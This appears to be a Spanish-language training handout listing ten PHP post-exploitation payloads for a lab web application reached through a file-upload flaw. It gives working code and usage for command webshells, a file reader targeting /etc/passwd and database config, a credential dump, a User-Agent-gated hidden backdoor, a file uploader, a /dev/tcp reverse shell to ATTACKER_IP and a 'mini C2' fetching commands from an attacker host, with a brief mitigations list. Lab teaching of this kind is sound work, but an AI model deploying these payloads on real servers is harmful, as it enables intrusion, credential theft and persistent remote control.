# Payloads PHP para laboratorio controlado

> Uso exclusivo en un entorno de laboratorio propio, aislado y autorizado.  
> Estos ejemplos forman parte de una práctica didáctica sobre subida de archivos, RCE y post-explotación básica.

---

## Índice

1. Webshell clásica
2. Webshell tipo panel
3. File browser
4. Lector de archivos
5. Dump de credenciales
6. Backdoor silenciosa
7. Uploader interno
8. Reverse shell on demand
9. Mini C2
10. Info leak con `phpinfo()`

---

## 🧠 1. Webshell clásica

Más útil que una reverse shell en algunos escenarios porque:

- Es persistente.
- Permite control vía navegador.
- No depende de conexión saliente desde la víctima.

### Código

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### Ejemplo de uso

```text
http://IP/portal_pyme/uploads/shell.php?cmd=whoami
```

Otros ejemplos:

```text
http://IP/portal_pyme/uploads/shell.php?cmd=id
http://IP/portal_pyme/uploads/shell.php?cmd=pwd
http://IP/portal_pyme/uploads/shell.php?cmd=ls+-la
```

### Qué se espera ver

```text
www-data
```

---

## 🔥 2. Webshell “bonita” tipo panel

Versión más cómoda para alumnos, ya que permite escribir comandos desde un formulario.

### Código

```php
<?php
echo "<form method='GET'>";
echo "<input type='text' name='cmd'>";
echo "<input type='submit'>";
echo "</form>";

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

### Ejemplo de uso

Abrir en navegador:

```text
http://IP/portal_pyme/uploads/panel.php
```

Comandos de prueba:

```bash
whoami
id
pwd
ls -la
```

---

## 🧠 3. File browser

Permite listar directorios del servidor desde el navegador.

### Código

```php
<?php
$dir = $_GET['dir'] ?? '.';
$files = scandir($dir);

foreach ($files as $f) {
    echo "<a href='?dir=$dir/$f'>$f</a><br>";
}
?>
```

### Ejemplo de uso

```text
http://IP/portal_pyme/uploads/browser.php
```

Listar otra ruta:

```text
http://IP/portal_pyme/uploads/browser.php?dir=/var/www/html
```

Listar `/etc`:

```text
http://IP/portal_pyme/uploads/browser.php?dir=/etc
```

### Utilidad

Sirve para descubrir:

- Rutas del servidor.
- Ficheros de configuración.
- Directorios interesantes.
- Posibles backups.

---

## 🔥 4. Lector de archivos

Permite leer archivos del sistema si el usuario del servidor web tiene permisos.

### Código

```php
<?php
if (isset($_GET['file'])) {
    echo "<pre>";
    echo htmlspecialchars(file_get_contents($_GET['file']));
    echo "</pre>";
}
?>
```

### Ejemplo de uso

```text
http://IP/portal_pyme/uploads/read.php?file=/etc/passwd
```

Leer configuración de la aplicación:

```text
http://IP/portal_pyme/uploads/read.php?file=/var/www/html/portal_pyme/config/db.php
```

Leer logs de Apache, si hay permisos:

```text
http://IP/portal_pyme/uploads/read.php?file=/var/log/apache2/access.log
```

### Objetivo didáctico

Este payload enseña la importancia de:

- Permisos de archivos.
- Separación de privilegios.
- Protección de ficheros sensibles.
- No permitir ejecución de código subido por usuarios.

---

## 💣 5. Dump de credenciales

Payload orientado a extraer usuarios y contraseñas desde la base de datos usando la configuración existente.

### Código

```php
<?php
include '../config/db.php';

$result = $conn->query("SELECT username, password FROM empleados");

while ($row = $result->fetch_assoc()) {
    echo $row['username'] . " : " . $row['password'] . "<br>";
}
?>
```

### Ejemplo de uso

```text
http://IP/portal_pyme/uploads/dump.php
```

### Resultado esperado

```text
admin : 21232f297a57a5a743894a0e4a801fc3
soporte : e10adc3949ba59abbe56e057f20f883e
superadmin : ...
```

### Relación con fases del laboratorio

Conecta varias fases:

```text
SQLi → usuarios → hashes → cracking → acceso
```

---

## 🧠 6. Backdoor silenciosa

Solo ejecuta comandos si se cumple una condición concreta. En este ejemplo, si el `User-Agent` es `secret`.

### Código

```php
<?php
if ($_SERVER['HTTP_USER_AGENT'] === 'secret') {
    system($_GET['cmd']);
}
?>
```

### Ejemplo de uso con curl

```bash
curl -A "secret" "http://IP/portal_pyme/uploads/backdoor.php?cmd=whoami"
```

Otros ejemplos:

```bash
curl -A "secret" "http://IP/portal_pyme/uploads/backdoor.php?cmd=id"
curl -A "secret" "http://IP/portal_pyme/uploads/backdoor.php?cmd=ls+-la"
```

### Qué ocurre si no se usa el User-Agent correcto

La página no devuelve nada, lo que la hace más discreta.

---

## 🔥 7. Uploader interno

Permite subir nuevos archivos desde una webshell ya subida.

### Código

```php
<?php
if (isset($_FILES['f'])) {
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo "OK";
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="f">
<input type="submit">
</form>
```

### Ejemplo de uso

Abrir:

```text
http://IP/portal_pyme/uploads/uploader.php
```

Subir otro payload:

```text
shell.php
read.php
dump.php
```

### Utilidad

Permite ampliar capacidades después del primer bypass de subida de archivos.

---

## 🧠 8. Reverse shell “on demand”

Permite indicar IP y puerto desde la URL para lanzar una reverse shell.

### Código

```php
<?php
if (isset($_GET['ip']) && isset($_GET['port'])) {
    $ip = $_GET['ip'];
    $port = $_GET['port'];
    exec("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
}
?>
```

### Preparar listener en Kali

```bash
nc -lvnp 4444
```

### Ejecutar desde navegador

```text
http://IP/portal_pyme/uploads/rev.php?ip=ATTACKER_IP&port=4444
```

Ejemplo:

```text
http://192.168.66.10/portal_pyme/uploads/rev.php?ip=192.168.66.100&port=4444
```

### Resultado esperado

En Kali:

```text
connect to [192.168.66.100] from [192.168.66.10]
www-data@victima:/var/www/html/portal_pyme/uploads$
```

---

## 💀 9. Mini C2

Obtiene un comando desde un servidor externo y lo ejecuta.

### Código

```php
<?php
$cmd = file_get_contents("http://attacker/cmd.txt");
system($cmd);
?>
```

### Preparar atacante

En Kali, crear un archivo:

```bash
echo "whoami" > cmd.txt
python3 -m http.server 8000
```

### Ajustar el payload

Cambiar la URL:

```php
$cmd = file_get_contents("http://192.168.66.100:8000/cmd.txt");
```

### Uso

Abrir:

```text
http://IP/portal_pyme/uploads/c2.php
```

### Cambiar comando remoto

En Kali:

```bash
echo "id" > cmd.txt
```

Volver a recargar `c2.php`.

### Objetivo didáctico

Explica cómo una backdoor puede recibir instrucciones desde fuera.

---

## 🧠 10. Info leak con `phpinfo()`

Muestra información del entorno PHP.

### Código

```php
<?php
phpinfo();
?>
```

### Ejemplo de uso

```text
http://IP/portal_pyme/uploads/info.php
```

### Información que puede revelar

- Versión de PHP.
- Rutas internas.
- Módulos habilitados.
- Variables de entorno.
- Configuración de subida de archivos.
- Límites de tamaño.
- Ficheros de configuración cargados.

### Ejemplos de datos útiles

```text
upload_max_filesize
post_max_size
disable_functions
document_root
loaded configuration file
```

---

## Recomendación para el laboratorio

No es necesario usar todos los payloads a la vez. Una progresión adecuada sería:

```text
1. Subida de archivo con doble extensión.
2. Webshell clásica para confirmar ejecución.
3. Lector de archivos para leer config/db.php.
4. Dump de credenciales.
5. Reverse shell como paso avanzado.
```

---

## Mitigaciones recomendadas

Para cerrar estas vulnerabilidades en un entorno real:

- Validar extensiones usando lista blanca estricta.
- Renombrar archivos subidos.
- Guardar uploads fuera del webroot.
- Deshabilitar ejecución PHP en `/uploads`.
- Validar MIME y contenido real del archivo.
- Usar permisos mínimos.
- No conservar nombres originales.
- Usar `open_basedir` si aplica.
- Deshabilitar funciones peligrosas como `system`, `exec`, `shell_exec`.
- Registrar y monitorizar subidas sospechosas.

---

## Resumen

| Payload | Uso principal |
|---|---|
| Webshell clásica | Ejecutar comandos por URL |
| Webshell panel | Ejecutar comandos desde formulario |
| File browser | Enumerar directorios |
| Lector de archivos | Leer archivos sensibles |
| Dump DB | Extraer credenciales |
| Backdoor silenciosa | Ejecución condicionada |
| Uploader interno | Subir más payloads |
| Reverse shell | Shell interactiva remota |
| Mini C2 | Control remoto por comandos externos |
| phpinfo | Reconocimiento del entorno |
